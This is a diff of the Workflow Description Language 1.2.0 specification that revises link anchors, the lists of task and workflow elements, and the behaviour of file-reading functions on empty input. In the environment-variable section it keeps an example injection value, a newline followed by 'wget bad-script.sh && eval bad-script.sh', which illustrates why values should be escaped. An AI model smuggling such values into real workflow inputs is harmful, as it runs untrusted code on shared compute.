@@ -6,8 +6,7 @@ This is version 1.2.0 of the Workflow Description Language (WDL) specification. 
 
 Revisions to this specification are made periodically in order to correct errors, clarify language, or add additional examples. Revisions are released as "patches" to the specification, i.e., the third number in the specification version is incremented. No functionality is added or removed after the initial revision of the specification is ratified.
 
-* [1.1.1](https://github.com/openwdl/wdl/tree/release-1.1.1/SPEC.md): 2023-10-04
-* [1.1.0](https://github.com/openwdl/wdl/tree/release-1.1.0/SPEC.md): 2021-01-29
+* [1.2.0](https://github.com/openwdl/wdl/tree/release-1.2.0/SPEC.md): 2024-05-24
  
 ## Table of Contents
 
@@ -81,6 +80,7 @@ Revisions to this specification are made periodically in order to correct errors
         - [Optional inputs with defaults](#optional-inputs-with-defaults)
     - [Private Declarations](#private-declarations)
     - [Environment Variables](#environment-variables)
+      - [String Escaping and Injection Prevention](#string-escaping-and-injection-prevention)
     - [Command Section](#command-section)
       - [Expression Placeholders](#expression-placeholders)
       - [Stripping Leading Whitespace](#stripping-leading-whitespace)
@@ -130,8 +130,8 @@ Revisions to this specification are made periodically in order to correct errors
         - [`allow_nested_inputs`](#allow_nested_inputs)
     - [Call Statement](#call-statement)
       - [Computing Call Inputs](#computing-call-inputs)
-    - [Scatter](#scatter)
-    - [Conditional (`if`)](#conditional-if)
+    - [Scatter Statement](#scatter-statement)
+    - [Conditional Statement](#conditional-statement)
 - [Standard Library](#standard-library)
   - [Numeric Functions](#numeric-functions)
     - [`floor`](#floor)
@@ -870,7 +870,7 @@ An execution engine may support [other ways](#input-and-output-formats) to speci
 
 A type may have a `?` postfix quantifier, which means that its value is allowed to be undefined without causing an error. A declaration with an optional type can only be used in calls or functions that accept optional values.
 
-WDL has a special value `None` whose meaning is "an undefined value". The `None` value has the (hidden) type [`Union`](#hidden-types), meaning `None` can be assigned to an optional declaration of any type.
+WDL has a special value `None` whose meaning is "an undefined value". The `None` value has the (hidden) type [`Union`](#union-hidden-type), meaning `None` can be assigned to an optional declaration of any type.
 
 An optional declaration has a default initialization of `None`, which indicates that it is undefined. An optional declaration may be initialized to any literal or expression of the correct type, including the special `None` value.
 
@@ -1263,7 +1263,7 @@ Test config:
 </p>
 </details>
 
-A `Map` is insertion-ordered, meaning the order in which elements are added to the `Map` is preserved, for example when [converting a `Map` to an array of `Pair`s](#-as_pairs).
+A `Map` is insertion-ordered, meaning the order in which elements are added to the `Map` is preserved, for example when [converting a `Map` to an array of `Pair`s](#as_pairs).
 
 <details>
 <summary>
@@ -1349,7 +1349,7 @@ Example output:
 </p>
 </details>
 
-Due to the lack of explicitness in the typing of `Object` being at odds with the goal of being able to know the type information of all WDL declarations, the use of the `Object` type and the `object` literal syntax have been deprecated. In WDL 2.0, `Object` will become a [hidden type](#hidden-types) that may only be instantiated by the execution engine. `Object` declarations can be replaced with use of [structs](#struct-definition).
+Due to the lack of explicitness in the typing of `Object` being at odds with the goal of being able to know the type information of all WDL declarations, the use of the `Object` type and the `object` literal syntax have been deprecated. In WDL 2.0, `Object` will become a [hidden type](#hidden-and-scoped-types) that may only be instantiated by the execution engine. `Object` declarations can be replaced with use of [structs](#struct-definition).
 
 ##### Custom Types (Structs)
 
@@ -1495,11 +1495,11 @@ The following sections enumerate the hidden and scoped types that are available 
 
 * It is the type of the special [`None`](#optional-types-and-none) value.
 * It is the return type of some standard library functions, such as [`read_json`](#read_json).
-* It is the type of some reserved [`requirements`](#✨-requirements-section) and [`hints`](#✨-hints-section) attributes.
+* It is the type of some [`requirements`](#-requirements-section) and reserved [`hints`](#-hints-section) attributes.
 
 ##### `hints`, `input`, and `output` (Scoped Types)
 
-The [`hints`](#✨-hints-section) section has [three scoped types](#hints-scoped-types) that may be instantiated by the user within that scope.
+The [`hints`](#-hints-section) section has [three scoped types](#hints-scoped-types) that may be instantiated by the user within that scope.
 
 ##### `task` (Hidden Scoped Type)
 
@@ -1667,7 +1667,7 @@ The table below lists all globally valid coercions. The "target" type is the typ
 | `Struct`         | `Object`         | `Object` keys must match `Struct` member names, and `Object` values must be coercible to `Struct` member types                                   |
 | `Struct`         | `Struct`         | The two `Struct` types must have members with identical names and compatible types (see [Struct-to-Struct Coercion](#struct-to-struct-coercion)) |
 
-The [`read_lines`](#read_lines) function presents a special case in which the `Array[String]` value it returns may be immediately coerced into other `Array[P]` values, where `P` is a primitive type. See [Appendix A](#array-deserialization-using-read_lines) for details and best practices.
+The [`read_lines`](#read_lines) function presents a special case in which the `Array[String]` value it returns may be immediately coerced into other `Array[P]` values, where `P` is a primitive type. See [Appendix A](#array-serializationdeserialization-using-write_linesread_lines) for details and best practices.
 
 ###### Order of Precedence
 
@@ -1720,7 +1720,7 @@ Boolean b3 = 1 == true
 
 A non-optional type `T` can always be coerced to an optional type `T?`, but the reverse is not true - coercion from `T?` to `T` is not allowed because the latter cannot accept `None`.
 
-This constraint propagates into compound types. For example, an `Array[T?]` can contain both optional and non-optional elements. This facilitates the common idiom [`select_first([expr, default])`](#select_first), where `expr` is of type `T?` and `default` is of type `T`, for converting an optional type to a non-optional type. However, an `Array[T?]` could not be passed to the [`sep`](#-sep) function, which requires an `Array[T]`.
+This constraint propagates into compound types. For example, an `Array[T?]` can contain both optional and non-optional elements. This facilitates the common idiom [`select_first([expr, default])`](#select_first), where `expr` is of type `T?` and `default` is of type `T`, for converting an optional type to a non-optional type. However, an `Array[T?]` could not be passed to the [`sep`](#sep) function, which requires an `Array[T]`.
 
 There are two exceptions where coercion from `T?` to `T` is allowed:
 
@@ -2199,6 +2199,11 @@ In operations on mismatched numeric types (e.g., `Int` + `Float`), the `Int` is 
 | 🗑 `File`    | `+`      | `File`    | `File`    | append file paths - error if second path is not relative |
 | 🗑 `File`    | `+`      | `String`  | `File`    | append file paths - error if second path is not relative |
 
+Boolean operator evaluation is minimal (or "short-circuiting"), meaning that:
+
+1. For `A && B`, if `A` evalutes to `false` then `B` is not evaluated
+2. For `A || B`, if `A` evaluates to `true` then `B` is not evaluated.
+
 WDL `String`s are compared by the unicode values of their corresponding characters. Character `a` is less than character `b` if it has a lower unicode value.
 
 Except for `String + File`, all concatenations between `String` and non-`String` types are deprecated and will be removed in WDL 2.0. The same effect can be achieved using [string interpolation](#expression-placeholders-and-string-interpolation).
@@ -2556,7 +2561,7 @@ Test config:
 
 #### Ternary operator (if-then-else)
 
-This operator takes three arguments: a condition expression, an if-true expression, and an if-false expression. The condition is always evaluated. If the condition is true then the if-true value is evaluated and returned. If the condition is false, the if-false expression is evaluated and returned. The if-true and if-false expressions must return values of the same type, such that the value of the if-then-else is the same regardless of which side is evaluated.
+This operator takes three arguments: a condition expression, an if-true expression, and an if-false expression. The condition is always evaluated. If the condition is `true` then the if-true value is evaluated and returned. If the condition is `false`, the if-false expression is evaluated and returned. The if-true and if-false expressions must return values of the same type, such that the value of the if-then-else is the same regardless of which side is evaluated.
 
 <details>
 <summary>
@@ -2771,7 +2776,7 @@ The result of evaluating an expression in a placeholder must ultimately be conve
 - `Float` is printed in the style `[-]ddd.dddddd`, with 6 digits after the decimal point.
 - `Boolean` is converted to the "stringified" version of its literal value, i.e., `true` or `false`.
 
-Compound types cannot be implicitly converted to `String`s. To convert an `Array` to a `String`, use the [`sep`](#-sep) function: `~{sep(",", str_array)}`. See the guide on [WDL value serialization](#appendix-a-wdl-value-serialization-and-deserialization) for more details and examples.
+Compound types cannot be implicitly converted to `String`s. To convert an `Array` to a `String`, use the [`sep`](#sep) function: `~{sep(",", str_array)}`. See the guide on [WDL value serialization](#appendix-a-wdl-value-serialization-and-deserialization) for more details and examples.
 
 If an expression within a placeholder evaluates to `None`, and either causes the entire placeholder to evaluate to `None` or causes an error, then the placeholder is replaced by the empty string.
 
@@ -2982,7 +2987,7 @@ Requirements:
 * `sep` MUST accept only a string as its value
 * `sep` is only allowed if the type of the expression is `Array[P]`
 
-The `sep` option can be replaced with a call to the [`sep`](#-sep) function:
+The `sep` option can be replaced with a call to the [`sep`](#sep) function:
 
 <details>
 <summary>
@@ -3539,13 +3544,19 @@ A WDL task can be thought of as a template for running a set of commands - speci
 
 A task is defined using the `task` keyword, followed by a task name that is unique within its WDL document.
 
-A task has a required [`command`](#command-section) that is a template for a Bash script.
+Tasks are comprised of the following elements:
 
-Tasks explicitly define their [`input`s](#task-inputs) and [`output`s](#task-outputs), which is essential for building dependencies between tasks and workflows. The value of an input declaration may be supplied by the caller. Tasks may have additional "private" declarations within the task body. All task declarations may be initialized with hard-coded literal values, or may have their values constructed from expressions. Input and private declarations can be referenced in the command template.
+* A single, optional [`input`](#task-inputs) section, which defines the inputs for the task.
+* A single, required [`command`](#command-section), which defines the Bash script to be executed.
+* A single, optional [`output`](#task-outputs) section, which defines the outputs for the task.
+* A single, optional [`requirements`](#-requirements-section) section, which defines the minimum, required runtime environment conditions.
+* A single, optional [`hints`](#-hints-section) section, which provides hints to the execution engine.
+* 🗑️ A single, optional [`runtime`](#-runtime-section) section, which defines the runtime environment conditions. This is mutually exclusive with the `requirements` and `hints` sections.
+* A single, optional [`meta`](#metadata-sections) section, which defines task-level metadata.
+* A single, optional [`parameter_meta`](#parameter-metadata-section) section, which defines parameter-level metadata.
+* Any number of [private declarations](#private-declarations).
 
-A task may also specify runtime environment [requirements](#requirements-section) (such as the amount of RAM or number of CPU cores) that must be satisfied in order for its commands to execute properly, and [hints](#✨-hints-section) that should be satisfied if possible.
-
-There are two optional metadata sections: the [`meta`](#metadata-sections) section, for task-level metadata, and the [`parameter_meta`](#parameter-metadata-section) section, for parameter-level metadata.
+There is no enforced order for task elements.
 
 The execution engine is responsible for "instantiating" the shell script (i.e., replacing all references with actual values) in an environment that meets all specified runtime requirements, localizing any input files into that environment, executing the script, and generating any requested outputs.
 
@@ -4093,13 +4104,9 @@ You could then construct an input that downloads a file, and attempts to gain ac
   "some_workflow.some_task":"\nwget bad-script.sh && eval bad-script.sh"
 }
 ```
-While the example above illustrates how a user of workflow may submit a bad value, there could possibly be many other sources
-of injection attacks. As workflows become dependent on other community generated workflows and files, it becomes quite easy to
-generate a source of an attack to perform some nefarious purpose.
+While the example above illustrates how a user of workflow may submit a bad value, there could possibly be many other sources of injection attacks. As workflows become dependent on other community generated workflows and files, it becomes quite easy to generate a source of an attack to perform some nefarious purpose.
 
-Using environment variables mitigates this problem almost entirely. When a value is declared with the `env` modifier, it becomes
-the execution engine's responsibility to escape the string thus preventing any sort of interpolation. Functionally,
-using an environment variable is the same as first escaping the string of any special characters and then wrapping it single quotes.
+Using environment variables mitigates this problem almost entirely. When a value is declared with the `env` modifier, it becomes the execution engine's responsibility to escape the string thus preventing any sort of interpolation. Functionally, using an environment variable is the same as first escaping the string of any special characters and then wrapping it single quotes.
 
 ```
 single_quote(escape(${variable}))
@@ -4740,7 +4747,7 @@ Declarations in the output section may reference any input and private declarati
 
 ### ✨ Requirements Section
 
-The `requirements` section defines a set of key/value pairs that represent the minimum requirements needed to run a task and the conditions under which a task should be interpreted as a failure or success. The `requirements` section is limited to the attributes defined in this specification. Arbitrary key/value pairs are not allowed in the `requirements` section, and must instead be placed in the [`hints`](#✨-hints-section) section.
+The `requirements` section defines a set of key/value pairs that represent the minimum requirements needed to run a task and the conditions under which a task should be interpreted as a failure or success. The `requirements` section is limited to the attributes defined in this specification. Arbitrary key/value pairs are not allowed in the `requirements` section, and must instead be placed in the [`hints`](#-hints-section) section.
 
 During execution of a task, all resource requirements within the `requirements` section must be enforced by the engine. If the engine is not able to provision the requested resources, then the task immediately fails. 
 
@@ -5013,7 +5020,7 @@ Test config:
 
 The `gpu` and `fpga` attributes indicate to the execution engine whether a task requires a GPU and/or FPGA accelerator to run to completion. The execution engine must guarantee that at least one of each of the request types of accelerators is available or immediately fail the task prior to instantiating the command.
 
-The [`gpu` and `fpga` hints](#✨-gpu-and-✨-fpga) can be used to request specific attributes for the provisioned accelerators (e.g., quantity, model, driver version).
+The [`gpu` and `fpga` hints](#-gpu-and--fpga) can be used to request specific attributes for the provisioned accelerators (e.g., quantity, model, driver version).
 
 <details>
 <summary>
@@ -5078,7 +5085,7 @@ The `disks` attribute provides a way to request one or more persistent volumes, 
 
 If a mount point is specified, then it must be an absolute path to a location in the host environment. If the mount point is omitted, it is assumed to be a persistent volume mounted at the root of the execution directory within a task.
 
-The execution engine is free to provision any class(es) of persistent volume it has available (e.g., SSD or HDD). The [`disks` hint](#✨-disks) hint can be used to request specific attributes for the provisioned disks.
+The execution engine is free to provision any class(es) of persistent volume it has available (e.g., SSD or HDD). The [`disks` hint](#-disks) hint can be used to request specific attributes for the provisioned disks.
 
 <details>
 <summary>
@@ -5339,9 +5346,9 @@ The `hints` section is optional and may contain any number of attributes (key/va
 
 #### Hints-scoped types
 
-There are three [scoped types](#scoped-types) that must be declared by the execution engine within the `hints` section. These types are intentionally given names that are already reserved keywords so that they don't conflict with any user-defined types.
+There are three [scoped types](#hidden-and-scoped-types) that must be declared by the execution engine within the `hints` section. These types are intentionally given names that are already reserved keywords so that they don't conflict with any user-defined types.
 
-The `hints` type is similar to `Object` in that it can contain arbitrary key-value pairs. However, the members of a `hints` object must have the same semantics as the `hints` section itself (i.e., any [reserved hints](#reserved-task-hints) must have the same types and allowed values), and the `hints` type cannot be nested (i.e., a member of a `hints` object may not have a `hints` type value). The `hints` type is primarily intended to be used to define the [`inputs`](#intputs), [`outputs`](#outputs), and [compute environment](#compute-environments) attributes.
+The `hints` type is similar to `Object` in that it can contain arbitrary key-value pairs. However, the members of a `hints` object must have the same semantics as the `hints` section itself (i.e., any [reserved hints](#reserved-task-hints) must have the same types and allowed values), and the `hints` type cannot be nested (i.e., a member of a `hints` object may not have a `hints` type value). The `hints` type is primarily intended to be used to define the [`inputs`](#inputs), [`outputs`](#outputs), and [compute environment](#compute-environments) attributes.
 
 The `input` and `output` types are similar to Structs whose member names are identical to the names of the enclosing task's input and output variables, respectively, and whose member values are all of type `hints`. However, unlike Structs, the keys of `input` and `output` literals may use dotted notation to refer to nested members of input and output Structs. See [`inputs`](#inputs) and [`outputs`](#outputs) for examples.
 
@@ -5440,7 +5447,7 @@ Volume specifications are left intentionally vague as they are primarily intente
     * `Int`: Minimum number of accelerators being requested.
     * `String`: Specification for accelerator(s) being requested, e.g., manufacturer or model name.
 
-A hint to the execution engine to provision [hardware accelerators](#hardware-accelerators-gpu-and-✨-fpga) with specific attributes. Accelerator specifications are left intentionally vague as they are primarily intended to be used in the context of a specific [compute environment](#✨-compute-environments).
+A hint to the execution engine to provision [hardware accelerators](#hardware-accelerators-gpu-and--fpga) with specific attributes. Accelerator specifications are left intentionally vague as they are primarily intended to be used in the context of a specific [compute environment](#compute-environments).
 
 ##### `short_task`
 
@@ -5724,7 +5731,7 @@ The `requirements` and `hints` sections comprise resource requests to the execut
 * The task metadata, to avoid duplication. For example, the task may wish to write log messages with the task's name and description without having to duplicate the information in the task's `meta` section.
 * The runtime engine may also choose to provide additional information at runtime.
 
-This information is provided by the `task` variable, which is implicitly defined by the execution engine. The type of `task` is a [scoped type](#scoped-types) with the following members:
+This information is provided by the `task` variable, which is implicitly defined by the execution engine. The type of `task` is a [scoped type](#hidden-and-scoped-types) with the following members:
 
 * `name`: The task name.
 * `id`: A `String` with the unique ID of the task. The execution engine may choose the format for this ID, but it is suggested to include at least the following information:
@@ -5806,7 +5813,7 @@ Test config:
 </p>
 </details>
 
-If a task is using the deprecated [`runtime`](#🗑-runtime-section) section rather than `requirements` and `hints`, then the runtime values of the reserved `runtime` attributes (i.e., the ones that appear in the `requirements` section) are populated in the `requirements` member.
+If a task is using the deprecated [`runtime`](#-runtime-section) section rather than `requirements` and `hints`, then the runtime values of the reserved `runtime` attributes (i.e., the ones that appear in the `requirements` section) are populated in the `requirements` member.
 
 ### Advanced Task Examples
 
@@ -5997,7 +6004,7 @@ Test config:
 
 ## Workflow Definition
 
-A workflow can be thought of as a directed acyclic graph (DAG) of transformations that convert the input data to the desired outputs. Rather than explicitly specifying the sequence of operations, A WDL workflow instead describes the connections between the steps in the workflow (i.e., between the nodes in the graph). It is the responsibility of the execution engine to determine the proper ordering of the workflow steps, and to orchestrate the execution of the different steps.
+A workflow can be thought of as a directed acyclic graph (DAG) of transformations that convert the input data to the desired outputs. Rather than explicitly specifying the sequence of operations, a WDL workflow instead describes the connections between the steps in the workflow (i.e., between the nodes in the graph). It is the responsibility of the execution engine to determine the proper ordering of the workflow steps, and to orchestrate the execution of the different steps.
 
 A workflow is defined using the `workflow` keyword, followed by a workflow name that is unique within its WDL document, followed by any number of workflow elements within braces.
 
@@ -6035,20 +6042,21 @@ workflow name {
 
 ### Workflow Elements
 
-Tasks and workflows have several elements in common. These sections have nearly the same usage in workflows as they do in tasks, so we just link to their earlier descriptions.
+Tasks and workflows have several elements in common. When applicable, the task definition for these sections is linked to rather than duplicated.
 
-* [`input` section](#task-inputs)
-* [Private declarations](#private-declarations)
-* [`output` section](#task-outputs)
-* [`hints` section](#)
-* [`meta` section](#metadata-sections)
-* [`parameter_meta` section](#parameter-metadata-section)
+A workflow is comprised of the following elements:
 
-In addition to these sections, a workflow may have any of the following elements that are specific to workflows:
+* A single, optional [`input`](#task-inputs) section (_identical to the `input` section within tasks_).
+* Any number of workflow execution elements, which include the following:
+  * A [private declaration](#private-declarations) (_identical to private declarations within tasks_).
+  * A [`call`](#call-statement) statement, which invokes tasks or subworkflows.
+  * A [`scatter`](#scatter-statement) statement, which enables parallelized of workflow execution elements across collections.
+  * A [conditional (`if`)](#conditional-statement) statement, which enables conditional execution of workflow execution elements.
+* A single, optional [`output`](#task-outputs) section (_identical to the `output` section within tasks_).
+* A single, optional [`meta`](#metadata-sections) section (_identical to the `meta` section within tasks_).
+* A single, optional [`parameter_meta`](#parameter-metadata-section) section (_identical to the `parameter_meta` section within tasks_).
 
-* [`call`s](#call-statement) to tasks or subworkflows
-* [`scatters`](#scatter), which are used to parallelize operations across collections
-* [Conditional (`if`)](#conditional-if-block) statements, which are only executed when a conditional expression evaluates to `true`
+There is no enforced order for workflow elements.
 
 ### Evaluation of Workflow Elements
 
@@ -6364,7 +6372,7 @@ The `hints` section is optional and may contain any number of attributes (key/va
 
 The execution engine may ignore any unsupported hint. A workflow execution never fails due to the inability of the execution engine to recognize or satisfy a hint.
 
-Unlike [task hints](#✨-hints-section), workflow hints must have literal values; expressions are not allowed.
+Unlike [task hints](#-hints-section), workflow hints must have literal values; expressions are not allowed.
 
 #### Reserved Workflow Hints
 
@@ -6923,7 +6931,7 @@ Example output:
 </p>
 </details>
 
-### Scatter
+### Scatter Statement
 
 Scatter/gather is a common parallelization pattern in computer science. Given a collection of inputs (such as an array), the "scatter" step executes a set of operations on each input in parallel. In the "gather" step, the outputs of all the individual scatter-tasks are collected into the final output.
 
@@ -7122,7 +7130,7 @@ Example output:
 </p>
 </details>
 
-### Conditional (`if`)
+### Conditional Statement
 
 A conditional statement consists of the `if` keyword, followed by a `Boolean` expression and a body of (potentially nested) statements. The conditional body is only evaluated if the conditional expression evaluates to `true`.
 
@@ -8344,7 +8352,7 @@ Example output:
 Int read_int(File)
 ```
 
-Reads a file that contains a single line containing only an integer and (optional) whitespace. If the line contains a valid integer, that value is returned as an `Int`, otherwise an error is raised.
+Reads a file that contains a single line containing only an integer and (optional) whitespace. If the line contains a valid integer, that value is returned as an `Int`. If the file is empty or does not contain a single integer, an error is raised.
 
 **Parameters**
 
@@ -8393,7 +8401,7 @@ Example output:
 Float read_float(File)
 ```
 
-Reads a file that contains only a numeric value and (optional) whitespace. If the line contains a valid floating point number, that value is returned as a `Float`, otherwise an error is raised.
+Reads a file that contains only a numeric value and (optional) whitespace. If the line contains a valid floating point number, that value is returned as a `Float`. If the file is empty or does not contain a single float, an error is raised.
 
 **Parameters**
 
@@ -8445,7 +8453,7 @@ Example output:
 Boolean read_boolean(File)
 ```
 
-Reads a file that contains a single line containing only a boolean value and (optional) whitespace. If the line contains "true" or "false", that value is returned as a `Boolean`, otherwise an error is raised.
+Reads a file that contains a single line containing only a boolean value and (optional) whitespace. If the non-whitespace content of the line is "true" or "false", that value is returned as a `Boolean`. If the file is empty or does not contain a single boolean, an error is raised. The comparison is case- and whitespace-insensitive.
 
 **Parameters**
 
@@ -8500,6 +8508,8 @@ Array[String] read_lines(File)
 Reads each line of a file as a `String`, and returns all lines in the file as an `Array[String]`. Trailing end-of-line characters (`\r` and `\n`) are removed from each line.
 
 The order of the lines in the returned `Array[String]` is the order in which the lines appear in the file.
+
+If the file is empty, an empty array is returned.
 
 **Parameters**
 
@@ -8639,6 +8649,8 @@ This function has three variants:
 1. `Array[Array[String]] read_tsv(File, [false])`: Returns each row of the table as an `Array[String]`. There is no requirement that the rows of the table are all the same length.
 2. `Array[Object] read_tsv(File, true)`: The second parameter must be `true` and specifies that the TSV file contains a header line. Each row is returned as an `Object` with its keys determined by the header (the first line in the file) and its values as `String`s. All rows in the file must be the same length and the field names in the header row must be valid `Object` field names, or an error is raised.
 3. `Array[Object] read_tsv(File, Boolean, Array[String])`: The second parameter specifies whether the TSV file contains a header line, and the third parameter is an array of field names that is used to specify the field names to use for the returned `Object`s. If the second parameter is `true`, the specified field names override those in the file's header (i.e., the header line is ignored).
+
+If the file is empty, an empty array is returned.
 
 If the entire contents of the file can not be read for any reason, the calling task or workflow fails with an error. Examples of failure include, but are not limited to, not having access to the file, resource limitations (e.g. memory) when reading the file, and implementation-imposed file size limits.
 
@@ -8873,6 +8885,8 @@ Reads a tab-separated value (TSV) file representing a set of pairs. Each row mus
 
 Each pair is added to a `Map[String, String]` in order. The values in the first column must be unique; if there are any duplicate keys, an error is raised.
 
+If the file is empty, an empty map is returned.
+
 **Parameters**
 
 1. `File`: Path of the two-column TSV file to read.
@@ -9007,11 +9021,13 @@ Reads a JSON file into a WDL value whose type depends on the file's contents. Th
 | boolean   | `Boolean`        |
 | null      | `None`           |
 
-The return value is of type [`Union`](#union) and must be used in a context where it can be coerced to the expected type, or an error is raised. For example, if the JSON file contains `null`, then the return value will be `None`, meaning the value can only be used in a context where an optional type is expected.
+The return value is of type [`Union`](#union-hidden-type) and must be used in a context where it can be coerced to the expected type, or an error is raised. For example, if the JSON file contains `null`, then the return value will be `None`, meaning the value can only be used in a context where an optional type is expected.
 
 If the JSON file contains an array, then all the elements of the array must be coercible to the same type, or an error is raised.
 
 The `read_json` function does not have access to any WDL type information, so it cannot return an instance of a specific `Struct` type. Instead, it returns a generic `Object` value that must be coerced to the desired `Struct` type.
+
+Note that an empty file is not valid according to the JSON specification, and so calling `read_json` on an empty file raises an error.
 
 **Parameters**
 
@@ -9205,7 +9221,7 @@ Each line is terminated by the newline (`\n`) character.
 Object read_object(File)
 ```
 
-Reads a tab-separated value (TSV) file representing the names and values of the members of an `Object`. There must be two rows, and each row must have the same number of elements. Trailing end-of-line characters (`\r` and `\n`) are removed from each line.
+Reads a tab-separated value (TSV) file representing the names and values of the members of an `Object`. There must be exactly two rows, and each row must have the same number of elements, otherwise an error is raised. Trailing end-of-line characters (`\r` and `\n`) are removed from each line.
 
 The first row specifies the object member names. The names in the first row must be unique; if there are any duplicate names, an error is raised.
 
@@ -9285,9 +9301,11 @@ Array[Object] read_objects(File)
 
 Reads a tab-separated value (TSV) file representing the names and values of the members of any number of `Object`s. Trailing end-of-line characters (`\r` and `\n`) are removed from each line.
 
-There must be a header row with the names of the object members. The names in the first row must be unique; if there are any duplicate names, an error is raised.
+The first line of the file must be a header row with the names of the object members. The names in the first row must be unique; if there are any duplicate names, an error is raised.
 
 There are any number of additional rows, where each additional row contains the values of an object corresponding to the member names. Each row in the file must have the same number of fields as the header row. All of the `Object`'s values are of type `String`.
+
+If the file is empty or contains only a header line, an empty array is returned.
 
 **Parameters**
 
@@ -11285,7 +11303,7 @@ The following would all be valid JSON inputs:
 
 ### Specifying / Overriding Requirements and Hints
 
-[Requirement](#✨-requirements-section) and [hint](#✨-hints-section) attributes can be specified (or overridden) for any task in the JSON input file. To differentiate requirements and hints from task inputs, the `requirements` or `hints` namespace is added after the task name.
+[Requirement](#-requirements-section) and [hint](#-hints-section) attributes can be specified (or overridden) for any task in the JSON input file. To differentiate requirements and hints from task inputs, the `requirements` or `hints` namespace is added after the task name.
 
 ```json
 {
@@ -11741,7 +11759,7 @@ A compound value such as `Array` or `Map` must be serialized to a string before 
 * Delimitation: convert each element of the compound value to a string, then join them together into a single string using a delimiter. Some common approaches are:
     * Separate values by a tool-specific delimiter (e.g., whitespace or comma) and pass the string as a single command line argument. This can be accomplished with the [`sep`](#sep) function.
     * Prefix each value with a command line option. This can be accomplished with the [`prefix`](#prefix) function.
-    * Separate values by newlines (`\n`) and write them to a file. This can be accomplished with the [`write_lines`](function).
+    * Separate values by newlines (`\n`) and write them to a file. This can be accomplished with the [`write_lines`](#write_lines) function.
     * For nested types such as `Struct`s and `Object`, separate the fields of each value with a tab (`\t`), and write each tab-delimited line to a file. This is commonly called tab_separated value (TSV) format. This can be accomplished using [`write_tsv`](#write_tsv), [`write_map`](#write_map), [`write_object`](#write_object), or [`write_objects`](#write_objects).
 
 Similarly, data output by a command must be deserialized to be used in WDL. Commands generally either write output to `stdout` (or sometimes `stderr`) or to a regular file. The contents of `stdout` and `stderr` can be read a files using the [`stdout`](#stdout) and [`stderr`](#stderr) functions. The two general strategies for deserializing data from a file are:
@@ -12375,7 +12393,7 @@ Where `/jobs/564757/sample_quality_scores.json` would contain:
 
 There are two alternative serialization formats for `Struct`s and `Objects:
 
-* JSON: `Struct`s and `Object`s are serialized identically using [`write_json`](#write_json). A JSON object is deserialized to a WDL `Object` using [`read_json](#read_json), which can then be coerced to a `Struct` type if necessary.
+* JSON: `Struct`s and `Object`s are serialized identically using [`write_json`](#write_json). A JSON object is deserialized to a WDL `Object` using [`read_json`](#read_json), which can then be coerced to a `Struct` type if necessary.
 * TSV: `Struct`s and `Object`s can be serialized to TSV format using [`write_object`](#write_object). The generated file has two lines tab-delimited: a header with the member names and the values, which must be coercible to `String`s. An array of `Struct`s or `Object`s can be written using [`write_objects`](#write_objects), in which case the generated file has one line of values for each struct/object. `Struct`s and `Object`s can be deserialized from the same TSV format using [`read_object`](#read_object)/[`read_objects`](#read_objects). Object member values are always of type `String` whereas struct member types must be coercible from `String`.
 
 # Appendix B: WDL Namespaces and Scopes
@@ -12392,7 +12410,7 @@ The following WDL namespaces exist:
     * A WDL document may contain `struct`s, which are also names within the document's namespace and usable as types in any declarations. Structs from any imported documents are [copied into the document's namespace](#importing-and-aliasing-structs) and may be aliased using the `alias <source name> as <new name>` syntax.
 * A [WDL `task`](#task-definition) is a namespace consisting of:
     * `input`, `output`, and private declarations
-    * A [`requirements`](#✨-requirements-section) namespace that contains all the runtime requirements
+    * A [`requirements`](#-requirements-section) namespace that contains all the runtime requirements
 * A [WDL `workflow`](#workflow-definition) is a namespace consisting of:
     * `input`, `output`, and private declarations
     * The [`call`s](#call-statement) made to tasks and subworkflows within the body of the workflow.
